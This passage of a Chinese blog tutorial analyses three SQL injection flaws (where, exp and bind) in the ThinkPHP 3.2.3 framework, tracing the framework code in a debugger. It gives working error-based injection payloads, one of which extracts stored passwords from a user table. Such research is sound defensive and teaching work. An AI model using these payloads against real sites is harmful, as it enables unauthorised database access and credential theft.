<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120855607.png"></p>
<p>访问<code>./index.php</code>出现以下界面，说明环境搭建成功</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719121126120.png"></p>
<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>配置文件位置<code>ThinkPHP/Conf/convention.php</code></p>
<p>参数配置如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">return array(</span><br><span class="line"> 	...</span><br><span class="line">    /* 数据库设置 */</span><br><span class="line">    &#x27;DB_TYPE&#x27;                =&gt; &#x27;mysql&#x27;, // 数据库类型</span><br><span class="line">    &#x27;DB_HOST&#x27;                =&gt; &#x27;127.0.0.1&#x27;, // 服务器地址</span><br><span class="line">    &#x27;DB_NAME&#x27;                =&gt; &#x27;thinkphp3&#x27;, // 数据库名</span><br><span class="line">    &#x27;DB_USER&#x27;                =&gt; &#x27;rev1ve&#x27;, // 用户名</span><br><span class="line">    &#x27;DB_PWD&#x27;                 =&gt; &#x27;rev1ve&#x27;, // 密码</span><br><span class="line">    &#x27;DB_PORT&#x27;                =&gt; &#x27;3306&#x27;, // 端口</span><br><span class="line">    &#x27;DB_PREFIX&#x27;              =&gt; &#x27;think_&#x27;, // 数据库表前缀</span><br><span class="line">    &#x27;DB_PARAMS&#x27;              =&gt; array(), // 数据库连接参数</span><br><span class="line">    &#x27;DB_DEBUG&#x27;               =&gt; false, // 数据库调试模式 开启后可以记录SQL日志</span><br><span class="line">    &#x27;DB_FIELDS_CACHE&#x27;        =&gt; true, // 启用字段缓存</span><br><span class="line">    &#x27;DB_CHARSET&#x27;             =&gt; &#x27;utf8&#x27;, // 数据库编码默认采用utf8</span><br><span class="line">    &#x27;DB_DEPLOY_TYPE&#x27;         =&gt; 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span><br><span class="line">    &#x27;DB_RW_SEPARATE&#x27;         =&gt; false, // 数据库读写是否分离 主从式有效</span><br><span class="line">    &#x27;DB_MASTER_NUM&#x27;          =&gt; 1, // 读写分离后 主服务器数量</span><br><span class="line">    &#x27;DB_SLAVE_NO&#x27;            =&gt; &#x27;&#x27;, // 指定从服务器序号</span><br><span class="line">	...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在thinkphp3下载一个管理工具phpMyAdmin，绑定thinkphp3网站</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719122604719.png"></p>
<p>创建thinkphp3数据库，登录phpMyAdmin</p>
<p>创建表的字段如下（注意数据表前缀和配置文件相同）</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720220721922.png"></p>
<hr>
<h2 id="ThinkPHP3-2-3-where注入漏洞"><a href="#ThinkPHP3-2-3-where注入漏洞" class="headerlink" title="ThinkPHP3.2.3 where注入漏洞"></a>ThinkPHP3.2.3 where注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
<p>修改一下<code>index()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">	$id=I(&#x27;GET.id&#x27;);</span><br><span class="line">    $data = M(&#x27;user&#x27;)-&gt;find($id);</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>结合报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>执行POC，通过报错得到user</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719150715147.png"></p>
<p>如果要执行查询表，注意表名是带前缀的<code>think_user</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from think_user limit 1),0x7e),1)#</span><br></pre></td></tr></table></figure>



<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在<code>$id</code>和<code>$data</code>分别下断点</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719181856182.png"></p>
<p>执行<code>id=1&#39;</code>，进行调试</p>
<p>跟进到<code>ThinkPHP\Common\functions.php</code>的<code>I()</code>方法，接收<code>$name</code>参数</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182045155.png"></p>
<p>这里的<code>$name</code>的值就为<code>GET.id</code>，我们下断点理解容易点</p>
<p>最后执行switch选择GET方法后break，<code>$input</code>数组为我们传参的<code>id=1&#39;</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221132344.png"></p>
<p>我们往下翻，由于<code>$name</code>不为空，那么来到第388行的elseif语句</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182848287.png"></p>
<p>这里进行判断<code>$input</code>数组的<code>$name</code>是否为空，而<code>$name</code>就是我们GET传参的参数id。判断为真后赋值给<code>$data</code></p>
<p>我们继续在第391行打上断点，调试发现执行完<code>$filters = isset($filter) ? $filter : C(&#39;DEFAULT_FILTER&#39;);</code></p>
<p><code>$filters</code>被赋值为<code>htmlspecialchars</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221231919.png"></p>
<p>这部分代码无关紧要，我们跳到第406行看看</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720121516617.png"></p>
<p>这里将<code>$filters</code>赋值给<code>$filter</code>也就是<code>htmlspecialchars</code>，然后如果该函数存在且<code>$data</code>不为数组，那么执行参数过滤也就是执行<code>htmlspecialchars($data)</code>。继续往后看，这里代码逻辑是如果<code>$data</code>为数组，那么执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_walk_recursive($data, &#x27;think_filter&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720122746298.png"></p>
<p>我们把GET传参改为<code>?id[where]=1&#39;</code>，并在这里下断点进行调试</p>
<p>跟进发现跳转到<code>think_filter()</code>方法，这里就是进行一个对SQL注入关键字的过滤</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720234336827.png"></p>
<p>最后返回值<code>$data</code>即<code>1&#39;</code>，这里的返回值作为后面find方法的输入（非常关键）</p>
<p>回到<code>Application\Home\Controller\IndexController.class.php</code>，把第9行和前面打的断点去掉，只留下第10行的断点，调试跟进一下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172553098.png"></p>
<p>来到<code>ThinkPHP\Common\functions.php</code>的<code>M()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172744907.png"></p>
<p>这里传参进来的是<code>$name</code>为user，由于<code>$name</code>不存在<code>:</code>所以<code>$class</code>默认赋值为<code>Think\Model</code>。<code>$guid</code>也由于<code>$connection</code>为空所以进行拼接，我们下断点看看，结果为<code>user_Think\Model</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720174258722.png"></p>
<p>然后因为<code>$_model</code>数组为空，所以这里进行实例化<code>Model</code>类</p>
<p>下断点调试，直接F10逐过程跟进到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>Model</code>类的find方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720222322968.png"></p>
<p>这里我们单步调试一行行看，注意<code>$options</code>就是我们前面提到的返回值<code>$data</code>，如果为字符型或者数字型，那么赋值给<code>$options</code>数组的where键。类似下面在这种格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$options=[&quot;where&quot; =&gt; [&quot;id&quot; =&gt; &quot;1&#x27;&quot;]];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个地方是where注入的核心点，我们可以传递数组<code>$data</code>绕过if语句的赋值，通过类似污染的手段直接对<code>$options[&#39;where&#39;]</code>赋值来绕过后面的数据验证，具体分析后面会提到</p>
</blockquote>
<p>继续往后看这里调用<code>_parseOptions()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185500361.png"></p>
<p>跟进一下，注意到存在对传参数据进行验证</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185656917.png"></p>
<p>这里if条件均为真，继续到foreach对字段进行匹配，接着跟进一下<code>_parseType()</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseType</span>(<span class="params">&amp;<span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="string">&#x27;:&#x27;</span> . <span class="variable">$key</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">        <span class="variable">$fieldType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;enum&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 支持ENUM类型优先检测</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bigint&#x27;</span>) &amp;&amp; <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;int&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;float&#x27;</span>) || <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;double&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bool&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = (<span class="keyword">bool</span>) <span class="variable">$data</span>[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里会把 id 进行强制类型转换，我们的<code>1&#39;</code>变成<code>1</code>然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询从而避免注入问题</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720225211676.png"></p>
<p><strong>总结</strong></p>
<p>注入点是where键，链子：传入<code>id=1&#39; -&gt; I() -&gt; find() -&gt; _parseOptions() -&gt; _parseType()</code> </p>
<p>而我们的id参数被改变的位置就在<code>_parseType()</code>中，进入这个方法的位置是<code>ThinkPHP/Library/Think/Model.class.php:704</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>我们要不经过if语句才能不被强制类型转换，这里破坏的条件是<code>is_array($options[&#39;where&#39;])</code>，我们前面有讲到GET传参会赋值给where键，那么我们可以直接赋值where键即可实现绕过</p>
<p><strong>被强制类型转换</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;         #变为1，即查询id=1的数据</span><br></pre></td></tr></table></figure>

<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235811333.png"></p>
<p><strong>直接赋值绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[where]=1&#x27;       #查询不到id=1&#x27;的数据，成功注入</span><br></pre></td></tr></table></figure>

<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235602341.png"></p>
<p>以上就是整个where注入的代码逻辑</p>
<hr>
<h2 id="ThinkPHP3-2-3-exp注入漏洞"><a href="#ThinkPHP3-2-3-exp注入漏洞" class="headerlink" title="ThinkPHP3.2.3 exp注入漏洞"></a>ThinkPHP3.2.3 exp注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
<p>修改一下<code>index()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    $User = D(&#x27;user&#x27;);</span><br><span class="line">    $map = array(&#x27;id&#x27; =&gt; $_GET[&#x27;id&#x27;]);</span><br><span class="line">    $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">    var_dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>执行POC，通过报错得到user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>注：这里后面的是<code>==</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721113425380.png"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在入口文件的第9行下断点，执行<code>?id=1&#39;</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721120815180.png"></p>
<p>调试跟进一下，在第654行下断点</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121007358.png"></p>
<p>可以发现这里<code>$class</code>经过<code>parse_res_name()</code>处理赋值为<code>Home\Model\UserModel</code>。由于该类不存在进入elseif语句，然后if语句为false，继续进入else语句，<code>$class</code>赋值为<code>\Common\Model\userModel</code>。接着如果该类还不存在，那么实例化<code>Think\Model</code>类</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121627878.png"></p>
<p>最后返回<code>Model</code>对象</p>
<p>回到入口文件后接收GET参数id，然后调用<code>Model</code>类的<code>where()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121946944.png"></p>
<p><code>$where</code>就是我们传参的数组<code>[&quot;id&quot; =&gt; &quot;1&#39;&quot;]</code>，而这里前面的if语句都不满足，直接跳到最后。因为<code>options</code>数组不存在where键，所以执行<code>$this-&gt;options[&#39;where&#39;] = $where;</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721142227954.png"></p>
<p>继续跟进到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>Model</code>类的find方法，这里和where注入的代码逻辑差不多，不过我们没有绕过<code>_parseType()</code>方法。直接到<code>$this-&gt;db-&gt;select($options);</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143536019.png"></p>
<p>在第822行下断点，调试跟进一下<code>select()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143648643.png"></p>
<p>在第1039行下断点，继续跟进<code>buildSelectSql()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143740667.png"></p>
<p>在第1060行下断点，继续跟进<code>parseSql()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143844490.png"></p>
<p>这里将<code>$sql</code>查询语句中的参数进行替换，我们的<code>$option</code>数组如下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143950540.png"></p>
<p>所以我们在第1079行下断点跟进<code>parseWhere()</code>方法，由于<code>$where</code>是数组，进入else语句</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721150702864.png"></p>
<p>然后foreach遍历where数组赋值，后面的if语句均为flase直接到第586行执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$whereStr .= $this-&gt;parseWhereItem($this-&gt;parseKey($key), $val);</span><br></pre></td></tr></table></figure>

<p>这里<code>$key</code>要先经过<code>parseKey()</code>处理，继续跟进<code>parseWhereItem()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151143041.png"></p>
<p>这部分就是代码的核心，首先判断<code>$val</code>是否为数组，然后根据<code>$val[0]</code>的参数值不同来执行代码。接着如果<code>$exp</code>为bind或exp， <code>$whereStr</code>会将<code>$key</code>与<code>$val[1]</code>进行拼接，所以我们payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>注：进行拼接的时候<code>$val[1]</code>需要有<code>=</code>，这样拼接后SQL查询语句才正确</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151959256.png"></p>
<p>最后再与where拼接替换到原SQL查询语句即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">... where `id` =1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>以上就是整个exp注入的代码逻辑</p>
<hr>
<h2 id="ThinkPHP3-2-3-bind注入漏洞"><a href="#ThinkPHP3-2-3-bind注入漏洞" class="headerlink" title="ThinkPHP3.2.3 bind注入漏洞"></a>ThinkPHP3.2.3 bind注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
<p>修改一下<code>index()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    $User = M(&quot;user&quot;);</span><br><span class="line">    $user[&#x27;id&#x27;] = I(&#x27;id&#x27;);</span><br><span class="line">    $data[&#x27;password&#x27;] = I(&#x27;password&#x27;);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p>执行POC，得到user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</span><br></pre></td></tr></table></figure>

<p>注：这里为<code>id[1]=0</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120123884.png"></p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们执行POC，在入口文件第12行下断点</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120651798.png"></p>
<p>单步调试，跟进<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>save()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120921487.png"></p>
<p>往下翻一下，这里代码逻辑和前面exp注入时分析的差不多</p>
<p>出现<code>_parseOptions()</code>方法进行强制类型转换</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121753096.png"></p>
<p>继续往下在第480行下断点，跟进一下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121845772.png"></p>
<p>这里我们可以看到有调用<code>parseWhere()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122234386.png"></p>
<p>我们前面在exp注入分析的时候有提到过，会继续调用<code>parseWhereItem()</code>方法，然后根据<code>$id[1]</code>的值不同来执行代码，其中如果等于bind的话会与<code>=:</code>拼接</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122514332.png"></p>
<p>我们尝试传入以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=aa</span><br></pre></td></tr></table></figure>

<p>可以发现SQL语句报错</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122603240.png">不难发现多了个冒号变成<code>:aa</code>，怎么样可以消除掉冒号呢？</p>
<p>把GET传参改回POC，我们在第985行下断点跟进<code>parseSet()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722142136358.png"></p>
<p>if语句不满足直接跳到第417的else语句，这里bind数组还是为空所以<code>$name</code>赋值为0，然后继续跟进<code>bindParam()</code>方法进行bind参数绑定，相当于得到<code>$bind</code>数组为<code>[&quot;:0&quot; =&gt;&quot;1&quot;]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function bindParam($name, $value)</span><br><span class="line">&#123;</span><br><span class="line">	$this-&gt;bind[&#x27;:&#x27; . $name] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里了解参数绑定过程后，单步跳出回到<code>update()</code>方法</p>
<p>我们往下看注意第997行的<code>execute()</code>方法</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125349581.png"></p>
<p>跟进到 <code>ThinkPHP/Library/Think/Db/Driver.class.php:207</code>的<code>execute()</code></p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125515834.png"></p>
<p>重点看下面代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind)) &#123;</span><br><span class="line">    <span class="variable">$that</span>           = <span class="variable language_">$this</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;queryStr = <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr, <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$val</span>) <span class="keyword">use</span> (<span class="variable">$that</span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的function是匿名函数，接收参数<code>$val</code>然后进行<code>escapeString()</code>处理（也就是转义处理），然后将<code>$val</code>拼接两个单引号并返回值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//匿名函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$val</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$that</span></span>) </span>&#123;	</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转义处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeString</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了<code>array_map()</code>函数为数组的每个元素应用回调函数（上面说到的匿名函数），而bind数组为<code>[&quot;:0&quot; =&gt;&quot;1&quot;]</code>，所以执行结果为<code>&#39;1&#39;</code>，bind数组变为为<code>[&quot;:0&quot; =&gt;&quot;&#39;1&#39;&quot;]</code></p>
<p>最后执行<code>strtr()</code>函数，我们在PHP中文手册查找下此函数，看下给的DEMO其实不难理解</p>
<p>具体就以下两点</p>
<ul>
<li>第一个参数是目标字符串</li>
<li>第二个参数是替换规则，由数组决定</li>
</ul>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722144530409.png"></p>
<p>所以我们bind数组就是替换规则，即<code>:0</code>替换成<code>&#39;1&#39;</code>。我们前面提到过<code>id[0]=bind</code>会使得查询语句与<code>:</code>拼接，而在这里我们让<code>id[1]</code>的值与<code>:</code>拼接后构造出<code>:0</code>，然后再被替换成<code>&#39;1&#39;</code>。所以这也是为什么我们POC会是0不是其他值</p>
<p>我们下断点看看前后变化，可以发现经过构造使得SQL查询语句的<code>:0</code>均被替换</p>
